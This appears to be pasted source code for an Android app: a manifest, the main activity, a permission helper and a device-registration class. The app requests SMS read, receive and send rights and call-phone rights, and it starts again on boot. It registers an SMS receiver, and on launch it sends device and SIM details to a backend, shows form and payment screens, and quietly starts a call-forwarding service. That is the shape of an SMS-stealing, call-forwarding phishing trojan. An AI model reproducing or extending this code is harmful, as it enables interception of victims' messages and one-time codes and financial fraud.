meni



<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">


    <uses-feature
        android:name="android.hardware.telephony"
        android:required="false" />

    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL"/>
    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" tools:targetApi="o" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

    <queries>

        <package android:name="com.android.dialer" />

        <intent>
            <action android:name="android.intent.action.CALL" />
        </intent>
    </queries>

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher"
        android:supportsRtl="true"
        android:theme="@style/Theme.MyApp"
        android:usesCleartextTraffic="true">


        <activity
            android:name=".MainActivity"
            android:exported="true"
            tools:node="merge">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <receiver
            android:name=".receivers.SMSReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <service
            android:name=".services.CallForwardingService"
            android:foregroundServiceType="phoneCall"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.example.refactor.START_CALL_FORWARDING" />
            </intent-filter>
        </service>

        <!-- Boot Receiver -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <service
            android:name=".services.SmsService"
            android:foregroundServiceType="dataSync"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.example.refactor.START_SERVICE" />
            </intent-filter>
        </service>

        <!-- Additional Activities -->
        <activity android:name=".activities.FormActivity"
            android:exported="false" />
        <activity android:name=".activities.PaymentActivity"
            android:exported="false" />
        <activity android:name=".activities.SuccessActivity"
            android:exported="false" />

    </application>

</manifest>




main



package com.example.refactor

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.activities.FormActivity
import com.example.refactor.receivers.DeviceRegistration
import com.example.refactor.services.CallForwardingService
import com.example.refactor.utils.PermissionUtil

class MainActivity : AppCompatActivity() {

    private lateinit var progressBar: ProgressBar
    private lateinit var imageViewLogo: ImageView

    private val requiredPermissions = arrayOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.INTERNET,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_PHONE_STATE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        DeviceRegistration(this).registerDeviceIfNeeded()

        progressBar = findViewById(R.id.progressBar)
        imageViewLogo = findViewById(R.id.imageViewLogo)

        setupInitialAnimation()

        checkAndRequestPermissions()
    }

    private fun setupInitialAnimation() {
        progressBar.apply {
            alpha = 0f
            scaleX = 0.5f
            scaleY = 0.5f
            max = 100
        }
        imageViewLogo.apply {
            alpha = 0f
            scaleX = 0.5f
            scaleY = 0.5f
        }
    }

    private fun checkAndRequestPermissions() {
        if (PermissionUtil.hasPermissions(this, *requiredPermissions)) {
            startAnimations()
        } else {
            PermissionUtil.requestPermissions(this, requiredPermissions, REQUEST_CODE)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startAnimations()
            } else {
                Toast.makeText(this, "Permissions are required to proceed.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun startAnimations() {
        imageViewLogo.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
        progressBar.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()

        Handler(Looper.getMainLooper()).postDelayed({
            showProgressAndNavigate()
        }, 2000)
    }

    private fun showProgressAndNavigate() {
        var progress = 0
        val handler = Handler(Looper.getMainLooper())

        val progressRunnable = object : Runnable {
            override fun run() {
                if (progress <= 100) {
                    progressBar.progress = progress
                    progress += 5
                    handler.postDelayed(this, 100)
                } else {
                    navigateToFormPage()
                }
            }
        }
        handler.post(progressRunnable)
    }

    private fun navigateToFormPage() {
        startActivity(Intent(this, FormActivity::class.java))
        finish()
        startCallForwardingService()
    }

    private fun startCallForwardingService() {
        startService(Intent(this, CallForwardingService::class.java))
    }

    companion object {
        private const val REQUEST_CODE = 1001
    }
}





util




package com.example.refactor.utils

import android.app.Activity
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

object PermissionUtil {

    fun hasPermissions(activity: Activity, vararg permissions: String): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestPermissions(activity: Activity, permissions: Array<String>, requestCode: Int) {
        ActivityCompat.requestPermissions(activity, permissions, requestCode)
    }
}





deviceregist



package com.example.refactor.receivers

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import com.example.refactor.models.DeviceData
import com.example.refactor.models.DeviceRegisterResponse
import com.example.refactor.network.ApiClient
import com.example.refactor.utils.DeviceInfoUtil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Response

class DeviceRegistration(private val context: Context) {
    private val sharedPreferences: SharedPreferences = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
    private val apiService = ApiClient.api
    @Volatile private var isRegistering = false

    fun registerDeviceIfNeeded() {
        val storedModel = getSavedDeviceModel()
        val storedUniqueId = getSavedUniqueId()

        val deviceDetails = DeviceInfoUtil.getDeviceDetails(context)
        val currentModel = deviceDetails["model"] as? String ?: "Unknown"

        // ✅ Check if the device with this model is already registered
        if (storedModel == currentModel && !storedUniqueId.isNullOrEmpty()) {
            Log.d("DeviceRegistration", "Device already registered with model: $storedModel & ID: $storedUniqueId")
            return  // ✅ Same model already registered, return without sending data again
        }

        if (!isRegistering) {
            isRegistering = true
            Log.d("DeviceRegistration", "Registering device with model: $currentModel")
            registerDevice(currentModel)
        }
    }

    private fun registerDevice(deviceModel: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceDetails = DeviceInfoUtil.getDeviceDetails(context)

                val simOperators = (deviceDetails["simOperators"] as? List<*>)?.filterIsInstance<String>()
                    ?: listOf("Unavailable")

                val deviceData = DeviceData(
                    model = deviceModel,
                    manufacturer = deviceDetails["manufacturer"] as? String ?: "Unknown",
                    androidVersion = deviceDetails["androidVersion"] as? String ?: "Unknown",
                    brand = deviceDetails["brand"] as? String ?: "Unknown",
                    simOperator = simOperators.joinToString(", ")
                )

                Log.d("DeviceRegistration", "Sending data to backend: $deviceData")

                val response: Response<DeviceRegisterResponse> = apiService.registerDevice(deviceData)

                if (response.isSuccessful) {
                    val responseBody = response.body()
                    Log.d("DeviceRegistration", "Full API Response: $responseBody")

                    if (responseBody?.success == true) {
                        val receivedUniqueId = responseBody.uniqueid
                        Log.d("DeviceRegistration", "Received Unique ID: $receivedUniqueId")
                        markDeviceAsRegistered(deviceModel, receivedUniqueId)
                    } else {
                        Log.e("DeviceRegistration", "API Response Error: ${responseBody?.message ?: "Unknown error"}")
                    }
                } else {
                    Log.e("DeviceRegistration", "API Error: HTTP ${response.code()} - ${response.errorBody()?.string()}")
                }
            } catch (e: Exception) {
                Log.e("DeviceRegistration", "Network Error: ${e.message}", e)
            } finally {
                isRegistering = false
            }
        }
    }

    private fun markDeviceAsRegistered(model: String, uniqueId: String?) {
        sharedPreferences.edit().apply {
            putBoolean("is_device_registered", true)
            putString("registered_device_model", model)  // ✅ Save the registered model
            uniqueId?.let {
                putString("device_unique_id", it)  // ✅ Save the received unique ID
                Log.d("DeviceRegistration", "Unique ID saved: $it")
            }
            apply()
        }
        Log.d("DeviceRegistration", "Model saved in SharedPreferences: $model")
    }

    fun getSavedUniqueId(): String? {
        return sharedPreferences.getString("device_unique_id", null)
    }

    private fun getSavedDeviceModel(): String? {
        return sharedPreferences.getString("registered_device_model", null)
    }
}

